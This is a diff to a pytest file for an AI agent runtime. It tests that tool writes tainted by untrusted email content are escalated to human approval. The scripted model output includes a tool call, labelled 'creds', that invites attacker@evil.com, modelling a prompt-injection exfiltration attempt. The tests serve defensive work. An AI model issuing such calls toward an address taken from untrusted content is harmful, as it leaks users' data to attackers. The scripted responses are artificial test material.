@@ -78,8 +78,9 @@ def _runtime(provider, executor=None):
     return runtime, executor, audit
 
 
-# Google Workspace with an auto_approve tier: send_email becomes an
+# Google Workspace with an auto_approve tier: create_event becomes an
 # auto-approved write (permission_tier == "auto" on the offered Tool).
+# send_email is always_confirm, so it never runs on standing consent.
 AUTO_GOOGLE_TOOLS = build_tools(
     [ConnectorSpec("google_workspace", permission_tier="auto_approve")],
     user_default_tier="auto_approve",
@@ -141,9 +142,9 @@ def test_tracker_flags_nested_argument_values():
 
 @pytest.mark.asyncio
 async def test_tainted_autoapproved_write_is_escalated_to_approval():
-    """Read an email (untrusted) that names a recipient, then the model
-    tries to auto-send to that recipient. The send must NOT execute; it must
-    surface as a pending approval instead."""
+    """Read an email (untrusted) that names an address, then the model tries
+    to auto-create an event inviting that address. The write must NOT
+    execute; it must surface as a pending approval instead."""
     provider = ScriptedProvider(
         [
             LLMResponse(
@@ -157,11 +158,12 @@ async def test_tainted_autoapproved_write_is_escalated_to_approval():
                 tool_calls=[
                     ToolCall(
                         id="w1",
-                        name="google_workspace.send_email",
+                        name="google_workspace.create_event",
                         arguments={
-                            "to": "attacker@evil.com",
-                            "subject": "creds",
-                            "body": "here",
+                            "event_data": {
+                                "summary": "creds",
+                                "attendees": [{"email": "attacker@evil.com"}],
+                            },
                         },
                     ),
                 ],
@@ -185,14 +187,51 @@ async def test_tainted_autoapproved_write_is_escalated_to_approval():
 
     # The read ran; the send did NOT auto-execute.
     assert [c["tool"] for c in executor.calls] == ["google_workspace.get_messages"]
-    assert any(pa.tool_name == "google_workspace.send_email" for pa in response.pending_approvals)
+    assert any(pa.tool_name == "google_workspace.create_event" for pa in response.pending_approvals)
     assert any(e["event"] == "tool_taint_escalated" for e in audit.entries)
 
 
 @pytest.mark.asyncio
 async def test_untainted_autoapproved_write_still_executes():
-    """A user-directed recipient not present in any untrusted result runs on
-    standing consent — taint tracking must not break legitimate auto-sends."""
+    """A user-directed invitee not present in any untrusted result runs on
+    standing consent: taint tracking must not break legitimate auto-writes."""
+    provider = ScriptedProvider(
+        [
+            LLMResponse(
+                content="",
+                tool_calls=[
+                    ToolCall(
+                        id="w1",
+                        name="google_workspace.create_event",
+                        arguments={
+                            "event_data": {
+                                "summary": "notes",
+                                "attendees": [{"email": "myfriend@school.edu"}],
+                            },
+                        },
+                    ),
+                ],
+            ),
+            LLMResponse(content="added"),
+        ]
+    )
+    runtime, executor, audit = _runtime(provider)
+
+    response = await runtime.chat(
+        messages=[{"role": "user", "content": "invite myfriend@school.edu to notes"}],
+        tools=AUTO_GOOGLE_TOOLS,
+        user_id="u1",
+    )
+
+    assert [c["tool"] for c in executor.calls] == ["google_workspace.create_event"]
+    assert response.pending_approvals == []
+    assert not any(e["event"] == "tool_taint_escalated" for e in audit.entries)
+
+
+@pytest.mark.asyncio
+async def test_always_confirm_send_email_is_parked_even_untainted():
+    """send_email is always_confirm: under an auto_approve tier, a clean,
+    user-directed send is still parked for approval and never executed."""
     provider = ScriptedProvider(
         [
             LLMResponse(
@@ -209,7 +248,7 @@ async def test_untainted_autoapproved_write_still_executes():
                     ),
                 ],
             ),
-            LLMResponse(content="sent"),
+            LLMResponse(content="drafted"),
         ]
     )
     runtime, executor, audit = _runtime(provider)
@@ -220,6 +259,8 @@ async def test_untainted_autoapproved_write_still_executes():
         user_id="u1",
     )
 
-    assert [c["tool"] for c in executor.calls] == ["google_workspace.send_email"]
-    assert response.pending_approvals == []
+    assert executor.calls == []
+    assert [pa.tool_name for pa in response.pending_approvals] == [
+        "google_workspace.send_email"
+    ]
     assert not any(e["event"] == "tool_taint_escalated" for e in audit.entries)
